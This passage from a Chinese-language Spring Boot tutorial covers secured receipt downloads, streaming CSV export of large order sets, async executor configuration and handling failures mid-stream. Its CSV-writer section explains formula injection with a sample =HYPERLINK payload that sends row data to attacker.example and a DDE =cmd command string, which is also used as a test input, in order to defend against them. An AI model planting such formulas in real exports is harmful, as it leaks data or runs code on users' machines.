            // ★ 回 404 而不是 403：403 會確認「這個 ID 存在」（資訊洩漏）
            //   03-rest-api 4.11.3 的原則
            throw new ResourceNotFoundException("Receipt", receiptId);
        }

        // ── 層 3：掃毒狀態（5.5.6）──────────────────────────────
        if (receipt.scanStatus() == ReceiptScanStatus.PENDING) {
            throw new ReceiptScanPendingException(receiptId);
        }
        if (receipt.scanStatus() == ReceiptScanStatus.INFECTED) {
            // 上傳時漏掉、事後補掃才發現的情況
            throw new ResourceNotFoundException("Receipt", receiptId);
        }

        // ── 層 4：稽核 ★ ───────────────────────────────────────
        // 「誰在什麼時候下載了誰的什麼檔案」是必須留紀錄的 ——
        // 個資事件調查時這是唯一的證據
        auditRepository.save(new AuditEvent(
                TraceContext.current(), "GET",
                "/orders/{orderId}/receipts/{receiptId}",
                "/orders/%s/receipts/%s".formatted(orderId, receiptId),
                null, 200, 0, Instant.now(), actor.id(), null));

        return toDownloadable(receipt);
    }
}
```

**一條可以放進 CI 的檢查**（ArchUnit）：

```java
package example.shop.arch;

import com.tngtech.archunit.core.domain.JavaClasses;
import com.tngtech.archunit.core.importer.ClassFileImporter;
import com.tngtech.archunit.junit.AnalyzeClasses;
import com.tngtech.archunit.junit.ArchTest;
import com.tngtech.archunit.lang.ArchRule;
import org.springframework.core.io.Resource;
import org.springframework.web.bind.annotation.GetMapping;

import static com.tngtech.archunit.lang.syntax.ArchRuleDefinition.methods;

@AnalyzeClasses(packages = "example.shop")
class DownloadAuthorizationTest {

    /**
     * 「每個回傳 Resource 的端點都必須有 Actor 參數」。
     *
     * <p>★ 這條規則抓不到「有 Actor 但沒用它」，
     * 但它抓得到「完全忘記授權」—— 而那是最常見的情況。
     *
     * <p>⚠️ 這種架構測試的價值不在完備性，而在「新人加了一個下載端點時，
     * CI 會問他一個問題」。
     */
    @ArchTest
    static final ArchRule 下載端點必須有Actor參數 = methods()
            .that().areAnnotatedWith(GetMapping.class)
            .and().haveRawReturnType(
                    com.tngtech.archunit.base.DescribedPredicate.describe(
                            "Resource 或 ResponseEntity<Resource>",
                            javaClass -> javaClass.isAssignableTo(Resource.class)
                                      || javaClass.getName().equals(
                                              "org.springframework.http.ResponseEntity")))
            .should(new ArchCondition<>("有 Actor 或 CurrentUser 參數") {
                @Override
                public void check(JavaMethod method, ConditionEvents events) {
                    boolean hasActor = method.getRawParameterTypes().stream()
                            .anyMatch(t -> t.getSimpleName().equals("Actor")
                                        || t.getSimpleName().equals("CurrentUser"));
                    if (!hasActor) {
                        events.add(SimpleConditionEvent.violated(method,
                                "下載端點 %s 沒有 Actor 參數 —— 它做了授權檢查嗎？"
                                        .formatted(method.getFullName())));
                    }
                }
            });
}
```

---

## 5.9 `StreamingResponseBody`：匯出 41 萬筆而不 OOM ★

### 5.9.1 四種回傳方式的記憶體行為

**同一個需求（匯出 41 萬筆訂單為 CSV），四種寫法**：

```java
// ① byte[] / String —— 事故 5.2.3
@GetMapping(produces = "text/csv")
public ResponseEntity<byte[]> exportA(OrderFilter filter) {
    return ResponseEntity.ok(buildEntireCsv(filter));           // 峰值 1.15 GB 🔴
}

// ② List<T> + 自訂 HttpMessageConverter
@GetMapping(produces = "text/csv")
public List<OrderSummary> exportB(OrderFilter filter) {
    return orderService.findAll(filter);                        // 峰值 780 MB 🔴
}
// converter 逐筆寫出去，所以「CSV 字串」不佔記憶體，
// 但「41 萬個 OrderSummary 物件」還是全部在 List 裡。

// ③ StreamingResponseBody + 分批查詢 ✅
@GetMapping(produces = "text/csv")
public ResponseEntity<StreamingResponseBody> exportC(OrderFilter filter) {
    StreamingResponseBody body = out -> {
        try (var writer = new BufferedWriter(new OutputStreamWriter(out, UTF_8))) {
            writer.write(HEADER);
            orderService.forEachBatch(filter, 1000, batch -> {   // 一次 1000 筆
                for (var o : batch) writer.write(toCsvLine(o));
            });
        }
    };
    return ResponseEntity.ok().body(body);                       // 峰值 約 3 MB ✅
}

// ④ 非同步工作 + 事後下載（5.10）✅✅
@PostMapping("/order-exports")
public ResponseEntity<ExportJobResponse> exportD(@RequestBody ExportRequest r) {
    var job = exportService.enqueue(r);
    return ResponseEntity.accepted()                             // 202
            .location(URI.create("/order-exports/" + job.jobId()))
            .body(toResponse(job));                              // 峰值 約 0 MB ✅
}
```

| 方式 | 記憶體峰值 | 佔用 Tomcat 執行緒 | 錯誤處理 | 適用 |
|---|---|---|---|---|
| ① `byte[]` | **1.15 GB** 🔴 | 全程 | ✅ 完整 | < 1000 筆 |
| ② `List<T>` + converter | **780 MB** 🔴 | 全程 | ✅ 完整 | < 5000 筆 |
| ③ `StreamingResponseBody` | **3 MB** ✅ | ⚠️ 換到 async executor | 🔴 **部分失效** | < 10 萬筆 / 5 分鐘內 |
| ④ 非同步工作 | **0 MB**（請求） | ✅ 幾乎不佔 | ✅ 完整 | 任意大小 |

**分界線的判準不是「幾筆」，是「多久」**：

```
使用者能接受的等待時間 ≈ 30 秒（超過就會重按或關掉分頁）
你的 Nginx proxy_read_timeout ≈ 60 秒（預設）
你的 LB idle timeout ≈ 60 秒（AWS ALB 預設）

→ 同步串流的實際上限是「能在 30 秒內跑完的量」
→ 41 萬筆訂單（含 JOIN 客戶與商品）約 90 秒 → 必須用 ④
```

⚠️ **但 ③ 仍然要學，因為 ④ 的背景工作內部也是用 ③ 的技巧
（只是寫到 S3 而不是寫到 HTTP 回應）。**

### 5.9.2 CSV 串流匯出的完整實作

```java
package example.shop.order.web;

import example.shop.common.web.ContentDispositions;
import example.shop.common.web.CurrentActor;
import example.shop.order.domain.Actor;
import example.shop.order.service.OrderQueryService;
import example.shop.order.service.query.OrderQuery;
import example.shop.order.web.dto.OrderFilter;
import jakarta.validation.Valid;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.http.*;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.servlet.mvc.method.annotation.StreamingResponseBody;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.nio.charset.StandardCharsets;
import java.time.LocalDate;

/**
 * 訂單的同步 CSV 匯出。
 *
 * <p>★ 這個端點有一個硬上限（{@code MAX_SYNC_ROWS}）。
 * 超過就回 {@code 413} 並告訴使用者「請用 POST /order-exports」（5.10）。
 * <b>「靜默地只給前 N 筆」是 04 章 4.2.3 那個 41 萬筆報表事故的成因</b>，
 * 這裡絕不重犯。
 */
@RestController
public class OrderCsvExportController {

    private static final Logger log = LoggerFactory.getLogger(OrderCsvExportController.class);

    /**
     * UTF-8 BOM。★ 不要寫成字面字元 —— 它在編輯器裡看不見，會造成詭異的 diff。
     *
     * <p>★ 公開（而不是 private）是刻意的：5.11.10 的關機版匯出、
     * 5.9.5 的 xlsx 匯出都要用同一個常數。
     * <b>「看不見的字元只能有一份定義」</b>。
     */
    public static final char UTF8_BOM = '\uFEFF';

    /** 同步匯出的硬上限 —— 約 15 秒可以跑完。 */
    private static final int MAX_SYNC_ROWS = 20_000;

    /** 一次從資料庫撈幾筆。太小 → round trip 太多；太大 → 記憶體。 */
    private static final int BATCH_SIZE = 1_000;

    private final OrderQueryService queryService;
    private final OrderWebMapper mapper;

    public OrderCsvExportController(OrderQueryService queryService, OrderWebMapper mapper) {
        this.queryService = queryService;
        this.mapper = mapper;
    }

    @GetMapping(value = "/orders.csv", produces = "text/csv")
    public ResponseEntity<StreamingResponseBody> exportCsv(
            @Valid OrderFilter filter,
            @CurrentActor Actor actor) {

        OrderQuery query = mapper.toQuery(filter, actor);

        // ── ① 先算總數（在寫任何 byte 之前）★★ ─────────────────────
        // 這是整個設計的關鍵：所有「可能失敗」的檢查都必須在
        // 回應開始之前完成，因為 committed 之後就不能改狀態碼了（5.9.4）。
        long total = queryService.count(query);

        if (total > MAX_SYNC_ROWS) {
            throw new SyncExportTooLargeException(total, MAX_SYNC_ROWS);
        }
        if (total == 0) {
            // ★ 0 筆也要回一個「只有標題列」的 CSV，而不是 204 或 404 ——
            //   使用者拿到一個空檔案比拿到錯誤好懂
            log.info("CSV 匯出 0 筆 actor={}", actor.id());
        }

        // ── ② 組回應標頭 ─────────────────────────────────────────
        String filename = "訂單明細-%s.csv".formatted(LocalDate.now());

        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(new MediaType("text", "csv", StandardCharsets.UTF_8));
        ContentDispositions.apply(headers, false, filename);
        // ★ 匯出結果含個資，絕不可快取
        headers.setCacheControl(CacheControl.noStore());
        // ★ 讓客戶端知道有幾筆（它可以顯示進度，也可以驗證有沒有被截斷）
        headers.set("X-Total-Count", String.valueOf(total));
        // ⚠️ 沒有 Content-Length —— 串流時我們不知道總位元組數。
        //    Spring 會走 Transfer-Encoding: chunked。
        //    代價：瀏覽器的下載進度條顯示「未知大小」。

        // ── ③ 串流本體 ───────────────────────────────────────────
        StreamingResponseBody body = outputStream -> {
            // ⚠️ 這個 lambda 在「另一個執行緒」上執行（5.9.3）：
            //    · SecurityContext 可能是空的  → 所以 actor 已經在上面取好，用閉包帶進來
            //    · MDC 可能是空的             → 需要 TaskDecorator（04 章 4.5.7）
            //    · 交易已經結束               → 所以查詢必須是「每批一個新交易」
            //    · @RequestScope 的 bean 不可用

            // ★ BufferedWriter 的緩衝區設 32 KB：
            //   太小 → 每次 write 都碰 socket，syscall 太多
            //   太大 → 客戶端要等很久才看到第一個 byte
            try (BufferedWriter writer = new BufferedWriter(
                    new OutputStreamWriter(outputStream, StandardCharsets.UTF_8), 32 * 1024)) {

                // ★ UTF-8 BOM：Excel（Windows 版）不看 charset，
                //   沒有 BOM 的話中文會變成亂碼。
                //   ⚠️ 但 BOM 會讓 pandas / awk 的第一個欄位名多出一個 U+FEFF ——
                //      這是一個「取悅 Excel 就得罪程式」的取捨。
                //      shop-service 選擇加 BOM，因為使用者是營運而不是工程師。
                //      （給程式讀的端點是 /orders.ndjson，那裡沒有 BOM。）
                writer.write(CsvWriter.UTF8_BOM);

                writer.write(CsvWriter.header(
                        "訂單編號", "客戶編號", "客戶名稱", "狀態",
                        "商品數", "小計", "運費", "折扣", "總金額",
                        "付款方式", "建立時間", "付款時間"));

                long written = 0;
                // ★ forEachBatch 內部用 keyset pagination（不是 OFFSET）——
                //   OFFSET 41 萬會讓最後一批慢到不可接受（07-mysql 第 03 章）
                for (var batch : queryService.batches(query, BATCH_SIZE)) {
                    for (var order : batch) {
                        writer.write(CsvWriter.row(
                                order.orderId(),
                                order.customerId(),
                                order.customerName(),
                                order.status().name(),
                                order.itemCount(),
                                order.subtotal(),
                                order.shippingFee(),
                                order.discount(),
                                order.total(),
                                order.paymentMethod(),
                                order.createdAt(),
                                order.paidAt()));
                        written++;
                    }
                    // ★ 每批 flush，讓客戶端提早看到資料（也避免緩衝區膨脹）
                    writer.flush();
                }

                writer.flush();
                log.info("CSV 匯出完成 rows={} actor={}", written, actor.id());

            } catch (IOException e) {
                // ★ 客戶端關掉瀏覽器 → Broken pipe。這不是錯誤（03 章 3.12.2）
                if (isClientAbort(e)) {
                    log.info("CSV 匯出被客戶端中斷 actor={}", actor.id());
                    return;
                }
                // 真正的 I/O 錯誤 → 讓它往上拋，Spring 會記錄
                // ⚠️ 但客戶端已經收到 200 + 部分資料了（5.9.4）
                throw e;
            }
        };

        return new ResponseEntity<>(body, headers, HttpStatus.OK);
    }

    static boolean isClientAbort(IOException e) {
        // ★ 這裡刻意用「型別名稱 + 訊息比對」而不是 import 特定型別：
        //   不同容器（Tomcat / Jetty / Undertow）拋不同的例外型別，
        //   而 Tomcat 的 ClientAbortException 不在 Spring 的 API 裡。
        //   Spring 6.1+ 有 AsyncRequestNotUsableException（IOException 的子類），
        //   也一併認得。
        String type = e.getClass().getSimpleName();
        if (type.equals("AsyncRequestNotUsableException")) return true;
        if (type.equals("ClientAbortException")) return true;
        String message = String.valueOf(e.getMessage()).toLowerCase();
        return message.contains("broken pipe")
                || message.contains("connection reset")
                || message.contains("connection was aborted");
    }
}
```

**`SyncExportTooLargeException` —— 錯誤訊息要給出路** ★

```java
package example.shop.order.web;

import example.shop.common.error.BusinessException;
import example.shop.common.error.ErrorCode;

import java.util.List;
import java.util.Map;

/**
 * 同步匯出超過上限。
 *
 * <p>★ 這個例外的價值全部在 {@code extensions} 裡：
 * 它不只說「你錯了」，還說「該怎麼做」。
 * 04 章 4.8.2 的分頁上限用了同樣的模式。
 */
public class SyncExportTooLargeException extends BusinessException {

    public SyncExportTooLargeException(long matched, int limit) {
        super(ErrorCode.PAYLOAD_TOO_LARGE,
              "The filter matches %d rows, exceeding the synchronous export limit of %d."
                      .formatted(matched, limit),
              null,
              Map.of("matchedRows", matched,
                     "maxSyncRows", limit,
                     // ★ 具體到「打哪一條 API、帶什麼參數」
                     "alternative", Map.of(
                             "method", "POST",
                             "path", "/order-exports",
                             "description", "建立非同步匯出工作，完成後可下載完整檔案"),
                     "hint", "符合條件的資料有 %,d 筆，超過即時匯出上限 %,d 筆。"
                             .formatted(matched, limit)
                             + "請改用「排程匯出」功能，或縮小日期範圍。"),
              new Object[0],
              List.of());
    }
}
```

```json
{
  "type": "https://api.shop.example/problems/payload-too-large",
  "title": "內容過大",
  "status": 413,
  "detail": "The filter matches 410233 rows, exceeding the synchronous export limit of 20000.",
  "instance": "/orders.csv",
  "code": "PAYLOAD_TOO_LARGE",
  "userMessage": "操作無法完成，請稍後再試。",
  "retryable": false,
  "traceId": "4f2c8a1e9b3d7c05",
  "timestamp": "2026-08-24T03:14:22Z",
  "matchedRows": 410233,
  "maxSyncRows": 20000,
  "alternative": {
    "method": "POST",
    "path": "/order-exports",
    "description": "建立非同步匯出工作，完成後可下載完整檔案"
  },
  "hint": "符合條件的資料有 410,233 筆，超過即時匯出上限 20,000 筆。請改用「排程匯出」功能，或縮小日期範圍。"
}
```

**CSV 的寫入工具 —— 公式注入必須處理** ★

```java
package example.shop.common.web;

import java.math.BigDecimal;
import java.time.Instant;
import java.time.temporal.Temporal;

/**
 * CSV 的一行。
 *
 * <p>★ 三個必須處理的問題：
 * <ol>
 *   <li><b>跳脫</b>：值裡有逗號、引號、換行時要用引號包起來並把 {@code "} 變成 {@code ""}。</li>
 *   <li><b>公式注入</b>（CSV injection / Formula injection）——
 *       見下面的詳細說明。</li>
 *   <li><b>型別格式</b>：{@code BigDecimal} 不能用科學記號、時間要用 ISO-8601。</li>
 * </ol>
 */
public final class CsvWriter {

    private static final String SEPARATOR = ",";
    private static final String LINE_END = "\r\n";     // ★ RFC 4180 規定 CRLF

    public static String header(String... columns) {
        return row((Object[]) columns);
    }

    public static String row(Object... values) {
        StringBuilder sb = new StringBuilder(256);
        for (int i = 0; i < values.length; i++) {
            if (i > 0) sb.append(SEPARATOR);
            sb.append(field(values[i]));
        }
        return sb.append(LINE_END).toString();
    }

    static String field(Object value) {
        if (value == null) return "";

        String s = switch (value) {
            // ★ BigDecimal.toString() 可能產生 "1.2805E+3" —— Excel 會顯示成科學記號
            case BigDecimal d -> d.toPlainString();
            case Instant i    -> i.toString();                 // ISO-8601 UTC
            case Temporal t   -> t.toString();
            default           -> String.valueOf(value);
        };

        s = neutraliseFormula(s);
        return needsQuoting(s) ? "\"" + s.replace("\"", "\"\"") + "\"" : s;
    }

    /**
     * CSV 公式注入的防護。★
     *
     * <p><b>攻擊</b>：使用者把自己的收件人姓名改成
     * <pre>=HYPERLINK("https://attacker.example?d="&amp;A1&amp;A2,"點我看報表")</pre>
     * 營運匯出訂單 CSV → 用 Excel 打開 → Excel 把它當公式 →
     * 營運點了那個看起來像正常連結的東西 → <b>整列資料被送到攻擊者的伺服器</b>。
     *
     * <p>更嚴重的版本用 {@code =cmd|'/c calc'!A1}（DDE），
     * 在舊版 Excel 上可以<b>執行任意程式</b>。
     * 現代 Excel 會先問「是否啟用」，但使用者會按「是」。
     *
     * <p><b>防法</b>：在危險的起始字元前加一個單引號（Excel 的「強制文字」前綴）。
     * ⚠️ 不能用「移除」——那會改變資料（一個真的叫 {@code -5} 的欄位會變成 {@code 5}）。
     */
    static String neutraliseFormula(String s) {
        if (s.isEmpty()) return s;
        char first = s.charAt(0);
        // = + - @ 是 Excel / LibreOffice / Google Sheets 的公式起始字元
        // \t \r 是 OWASP 建議一併處理的（某些版本會忽略前導空白後再解析）
        if (first == '=' || first == '+' || first == '-' || first == '@'
                || first == '\t' || first == '\r') {
            return "'" + s;
        }
        return s;
    }

    private static boolean needsQuoting(String s) {
        return s.indexOf(',') >= 0 || s.indexOf('"') >= 0
                || s.indexOf('\n') >= 0 || s.indexOf('\r') >= 0
                || s.startsWith(" ") || s.endsWith(" ");
    }

    private CsvWriter() {}
}
```

```java
class CsvWriterTest {

    @Test
    @DisplayName("公式被加上單引號前綴")
    void 公式注入() {
        assertThat(CsvWriter.field("=1+1")).isEqualTo("'=1+1");
        assertThat(CsvWriter.field("+886912345678")).isEqualTo("'+886912345678");
        assertThat(CsvWriter.field("@user")).isEqualTo("'@user");
        // 有引號 → 除了前綴還要被 quote 起來
        assertThat(CsvWriter.field("=cmd|'/c calc'!A1"))
                .isEqualTo("'=cmd|'/c calc'!A1");
    }

    @Test
    @DisplayName("負數也被加前綴 —— 這是刻意的取捨")
    void 負數() {
        // ⚠️ 這會讓 Excel 把 -100 當文字而不是數字。
        //    取捨：安全 > 便利。「給營運看的報表」正式管道是 xlsx（5.9.5），
        //    那裡數字就是數字，也不存在公式注入。
        assertThat(CsvWriter.field("-100")).isEqualTo("'-100");
        assertThat(CsvWriter.field(new java.math.BigDecimal("-100.50")))
                .isEqualTo("'-100.50");
    }

    @Test
    @DisplayName("BigDecimal 不用科學記號")
    void 科學記號() {
        assertThat(CsvWriter.field(new java.math.BigDecimal("1.2805E+3")))
                .isEqualTo("1280.5");
    }

    @Test
    @DisplayName("引號與換行被正確跳脫")
    void 跳脫() {
        assertThat(CsvWriter.field("他說「好\"啊」"))
                .isEqualTo("\"他說「好\"\"啊」\"");
        assertThat(CsvWriter.field("第一行\n第二行"))
                .isEqualTo("\"第一行\n第二行\"");
        assertThat(CsvWriter.field("a,b")).isEqualTo("\"a,b\"");
    }

    @Test
    @DisplayName("null 變空字串而不是 \"null\"")
    void nullValue() {
        assertThat(CsvWriter.field(null)).isEmpty();
        assertThat(CsvWriter.row("a", null, "c")).isEqualTo("a,,c\r\n");
    }

    @Test
    @DisplayName("前後空白會被 quote 保留（否則 Excel 會吃掉）")
    void 空白() {
        assertThat(CsvWriter.field(" 前有空白")).isEqualTo("\" 前有空白\"");
    }
}
```

⚠️ **「負數變文字」這個取捨值得展開**。三個選項：

| 選項 | 後果 |
|---|---|
| 全部加前綴（上面的做法） | 安全，但金額在 Excel 裡是文字 → 無法直接加總 |
| 只對「來自使用者輸入的欄位」加前綴 | 正確，但需要為每個欄位標註「這是使用者輸入嗎」 |
| **改用 xlsx** ★ | 真正的解法 —— xlsx 有型別，數字就是數字，字串就是字串，**不存在公式注入** |

**shop-service 的做法**：CSV 端點對所有欄位加前綴（安全優先），
而「給營運做報表」的正式管道是 xlsx（5.9.5）。

### 5.9.3 `StreamingResponseBody` 在哪個執行緒上執行 ★

**這是 `StreamingResponseBody` 最重要也最容易出事的細節。**

```
① Tomcat 執行緒（http-nio-8080-exec-3）
   · 執行 Controller 方法
   · 回傳 ResponseEntity<StreamingResponseBody>
   · Spring 呼叫 request.startAsync()
   · ★ Tomcat 執行緒被釋放，回到執行緒池

② 非同步執行緒（依設定而異）
   · 執行 StreamingResponseBody.writeTo(outputStream)
   · 寫完後呼叫 asyncContext.complete()

③ Tomcat 執行緒（可能是不同的一條）
   · ASYNC dispatch，跑完 filter chain 的收尾（04 章 4.7.4）
```

⚠️ **第 ② 步用的是哪個執行緒池？**

```java
// Spring 的 WebMvcConfigurationSupport
// 如果你沒有設定 AsyncTaskExecutor，Spring 用的是：
new SimpleAsyncTaskExecutor("MvcAsync");
```

**`SimpleAsyncTaskExecutor` 是「每個任務開一條新執行緒」的實作。**

```
100 個併發匯出請求 → 100 條新執行緒
1000 個併發 → 1000 條新執行緒（每條 1 MB stack = 1 GB）
   → OutOfMemoryError: unable to create new native thread
```

**Spring 啟動時會警告你**（很多人沒看到）：

```
WARN  o.s.w.c.request.async.WebAsyncManager -
!!! An Executor is required to handle java.util.concurrent.Callable return values.
Please, configure a TaskExecutor in the MVC config under "async support".
The SimpleAsyncTaskExecutor currently in use is not suitable under load.
```

**必須設定**：

```java
package example.shop.common.config;

import example.shop.common.web.MdcTaskDecorator;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.task.AsyncTaskExecutor;
import org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor;
import org.springframework.web.servlet.config.annotation.AsyncSupportConfigurer;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

import java.util.concurrent.ThreadPoolExecutor;

/**
 * 非同步 MVC 的設定（04 章 4.5.7 的延續，這裡補上串流專用的池）。
 *
 * <p>★ 為什麼串流要一個「獨立的」執行緒池：
 * <ul>
 *   <li>串流任務很長（幾十秒），會霸佔執行緒。</li>
 *   <li>如果和 {@code @Async} 的通知寄送共用一個池，
 *       一波匯出就會讓通知信全部卡住。</li>
 *   <li><b>獨立的池讓「匯出飽和」的影響被隔離</b>（bulkhead 模式）。</li>
 * </ul>
 */
@Configuration
public class AsyncMvcConfig implements WebMvcConfigurer {

    private final AsyncTaskExecutor streamingExecutor;

    public AsyncMvcConfig(
            @org.springframework.beans.factory.annotation.Qualifier("mvcStreamingExecutor")
            AsyncTaskExecutor streamingExecutor) {
        this.streamingExecutor = streamingExecutor;
    }

    @Override
    public void configureAsyncSupport(AsyncSupportConfigurer configurer) {

        // ★ 一定要設 timeout —— 預設是「無限」（04 章 4.5.7）。
        //   無限意味著一個卡住的串流會永久佔用一條執行緒。
        configurer.setDefaultTimeout(120_000);       // 2 分鐘

        configurer.setTaskExecutor(streamingExecutor);
    }

    @Bean("mvcStreamingExecutor")
    public AsyncTaskExecutor mvcStreamingExecutor() {
        ThreadPoolTaskExecutor executor = new ThreadPoolTaskExecutor();

        // ★ 池大小的計算：
        //   串流是 I/O bound（等資料庫、等 socket），所以可以比 CPU 數多。
        //   但每條執行緒都會持有一個 32 KB 的 buffer + 一批 1000 筆資料（約 2 MB），
        //   所以 16 條 ≈ 32 MB —— 可接受。
        executor.setCorePoolSize(4);
        executor.setMaxPoolSize(16);

        // ⚠️ 佇列必須小！
        //   佇列大 → 請求在佇列裡等 60 秒 → 客戶端已經逾時了才開始處理
        //   佇列小 + AbortPolicy → 立刻回 503，客戶端可以重試
        executor.setQueueCapacity(8);

        executor.setThreadNamePrefix("mvc-stream-");

        // ★ 04 章 4.5.7 的 MdcTaskDecorator：讓串流執行緒的 log 也有 traceId
        executor.setTaskDecorator(new MdcTaskDecorator());

        // ★ 飽和策略：AbortPolicy → 拋 RejectedExecutionException
        //   ⚠️ 預設的 AbortPolicy 正是我們要的；但如果有人改成 CallerRunsPolicy，
        //      Tomcat 執行緒就會去跑串流 —— 那完全違背了「釋放容器執行緒」的目的，
        //      而且會讓 Tomcat 執行緒池在高負載時被匯出任務吃光。
        executor.setRejectedExecutionHandler(new ThreadPoolExecutor.AbortPolicy());

        // 優雅關閉：等串流跑完再結束（但最多 30 秒）
        executor.setWaitForTasksToCompleteOnShutdown(true);
        executor.setAwaitTerminationSeconds(30);

        executor.initialize();
        return executor;
    }
}
```

**`RejectedExecutionException` 要進 advice**：

```java
    /**
     * 非同步執行緒池飽和。
     *
     * <p>★ 回 503 + Retry-After 而不是 500：
     * 這是「暫時性」的容量問題，客戶端重試是正確的行為。
     */
    @ExceptionHandler(java.util.concurrent.RejectedExecutionException.class)
    public ResponseEntity<Problem> handleRejected(
            java.util.concurrent.RejectedExecutionException ex,
            HttpServletRequest request) {

        log.warn("非同步執行緒池飽和 uri={} reason={}",
                 request.getRequestURI(), ex.getMessage());
        meterRegistry.counter("shop.async.rejected",
                "endpoint", endpointTemplate(request)).increment();

        Problem problem = problems.from(ErrorCode.SERVICE_UNAVAILABLE,
                ProblemFactory.instanceOf(request),
                "The server is currently at capacity for streaming responses.",
                Map.of("retryAfterSeconds", 10));

        return ResponseEntity.status(HttpStatus.SERVICE_UNAVAILABLE)
                .header("Retry-After", "10")
                .contentType(MediaType.APPLICATION_PROBLEM_JSON)
                .body(problem);
    }
```

**六個「在串流執行緒上不可用」的東西**：

| 東西 | 為什麼不可用 | 解法 |
|---|---|---|
| `SecurityContextHolder` | `ThreadLocal`，不會跨執行緒 | ★ 在 Controller 方法裡取好 `Actor`，用閉包帶進 lambda |
| **MDC（traceId）** | 同上 | `MdcTaskDecorator`（04 章 4.5.7） |
| `RequestContextHolder` | 同上 | 需要的資訊在 Controller 取好 |
| **`@Transactional` 的交易** | Controller 方法已經返回，交易早就提交 | ★ 讓查詢每一批自己開交易（見下） |
| Hibernate 的 lazy 關聯 | Session 已關閉 → `LazyInitializationException` | 用 DTO 投影查詢，不要傳 Entity |
| `@RequestScope` 的 bean | 請求 scope 在 async 上的行為不確定 | 不要在串流裡注入它們 |

⚠️ **「交易」這一項是最容易踩的**：

```java
    // 🔴 錯誤：想用一個交易包住整個串流
    @Transactional(readOnly = true)
    @GetMapping("/orders.csv")
    public ResponseEntity<StreamingResponseBody> export() {
        return ok(out -> {
            // 這裡的交易已經結束了 —— @Transactional 的 proxy 在方法 return 時提交
            // Hibernate Session 已關閉 → 任何 lazy 存取都爆
        });
    }
```

```java
    // ✅ 正確：每一批自己開一個短交易
    public interface OrderQueryService {

        /**
         * 分批走訪查詢結果。
         *
         * <p>★ 每一批在<b>自己的交易</b>裡執行（實作用 keyset pagination）。
         * 這代表：
         * <ul>
         *   <li>不會有一個開幾十秒的長交易（07-mysql 第 04 章：長交易會讓
         *       undo log 膨脹、讓 MVCC 的清理停擺）。</li>
         *   <li>⚠️ 代價：<b>沒有一致的快照</b> —— 走訪期間新增的訂單可能
         *       出現在後面的批次裡。對「匯出報表」這是可以接受的
         *       （而且 filter 通常有 createdTo 上界，所以實際上不會發生）。</li>
         * </ul>
         *
         * <p>回傳 {@code Iterable} 而不是接 callback，是為了讓呼叫端
         * 可以用一般的 for 迴圈（而 lambda 裡不能拋 checked exception，
         * 那會讓 {@code writer.write()} 的 {@code IOException} 很難處理）。
         */
        Iterable<java.util.List<OrderSummary>> batches(OrderQuery query, int batchSize);

        long count(OrderQuery query);
    }
```

⚠️ **最後那段註解是一個實務上很常見的設計理由**：
「為什麼不用 `forEach(Consumer)` 而用 `Iterable`」——
因為 `Consumer` 不能拋 checked exception，
而串流的 body 裡到處都是 `IOException`。
硬要用 callback 就得包一層 `UncheckedIOException`，讓錯誤處理變複雜。

### 5.9.4 串流到一半失敗了怎麼辦 ★

**這個問題沒有漂亮的答案。** 先看清楚問題有多硬：

```
t=0.0s   Controller 回傳 StreamingResponseBody
t=0.1s   Spring 寫出 HTTP 狀態列與標頭
         → HTTP/1.1 200 OK
         → Content-Type: text/csv
         ★ 回應已 committed。狀態碼永遠是 200 了。
t=0.2s   寫出前 8000 筆（約 1.2 MB）
t=6.4s   資料庫連線斷掉 → SQLException
t=6.4s   ??? 現在怎麼辦？
```

**你已經送出的東西：`200 OK` + 8000 筆合法的 CSV。**

**五個選項與它們的問題**：

| 選項 | 做法 | 問題 |
|---|---|---|
| ① 什麼都不做，讓例外往上拋 | Spring 記 log，連線被關 | 客戶端拿到一個**看起來完整**的 8000 筆檔案 🔴 |
| ② 寫一行錯誤訊息到 CSV 裡 | `writer.write("### ERROR ###")` | 使用者可能沒看到最後一行；Excel 會把它當一筆資料 |
| ③ 用 HTTP trailer | `Trailer: X-Export-Status` | 🔴 幾乎沒有 client 讀 trailer（curl 不顯示、`fetch` 讀不到） |
| ④ **主動破壞內容** | 中途寫出無效的位元組 | 對 CSV 沒用（CSV 沒有「結構完整性」）；對 JSON 有用 |
| ⑤ **改用非同步工作**（5.10） | 檔案在背景產生完才給下載連結 | ✅ **這是真正的解法** |

⚠️ **① 是最危險的**，因為「部分成功」在 CSV 上完全看不出來。
營運拿到 8000 筆會以為那就是全部（**又一次 41 萬筆報表事故**）。

**shop-service 的三層做法**：

**第一層：讓錯誤在寫出任何 byte 之前發生。**

```java
        // 5.9.2 的 ① —— 所有能提早做的檢查都提早做
        long total = queryService.count(query);        // 資料庫壞了？現在就知道
        if (total > MAX_SYNC_ROWS) throw ...;          // 太大？現在就拒絕
        // 授權由 mapper.toQuery(filter, actor) 收斂（它會把 customerId 條件強制加上）
```

**第二層：在資料裡放一個「完整性標記」。** ★

```java
        StreamingResponseBody body = outputStream -> {
            var writer = new BufferedWriter(
                    new OutputStreamWriter(outputStream, StandardCharsets.UTF_8), 32768);
            long written = 0;
            boolean completed = false;
            String traceId = TraceContext.current();     // ★ 在進 lambda 前取，或用 MDC decorator
            try {
                writer.write(CsvWriter.UTF8_BOM);
                writer.write(CsvWriter.header(/* … */));
                written = writeAllRows(writer, query);
                completed = true;
            } finally {
                try {
                    // ★ 最後一行一定是一個「摘要列」，包含預期筆數與實際筆數。
                    //   使用者（或程式）可以比對這兩個數字判斷檔案是否完整。
                    writer.write(CsvWriter.row(
                            "#SUMMARY",
                            completed ? "COMPLETE" : "INCOMPLETE",
                            "expected=" + total,
                            "written=" + written,
                            "traceId=" + traceId));
                    writer.flush();
                } catch (IOException ignored) {
                    // 連摘要都寫不出去 → 連線真的斷了，沒別的辦法
                    // ⚠️ 這個 catch 是必要的：finally 裡拋例外會「取代」原本的例外
                    //    （04 章 4.11.3 的陷阱 3）
                }
            }
        };
```

```csv
訂單編號,客戶編號,狀態,總金額,建立時間
ord_01k1,cus_9f,PAID,1280.50,2026-08-01T02:11:03Z
...（8000 行）...
#SUMMARY,INCOMPLETE,expected=20000,written=8000,traceId=4f2c8a1e9b3d7c05
```

**這個摘要列做到三件事**：

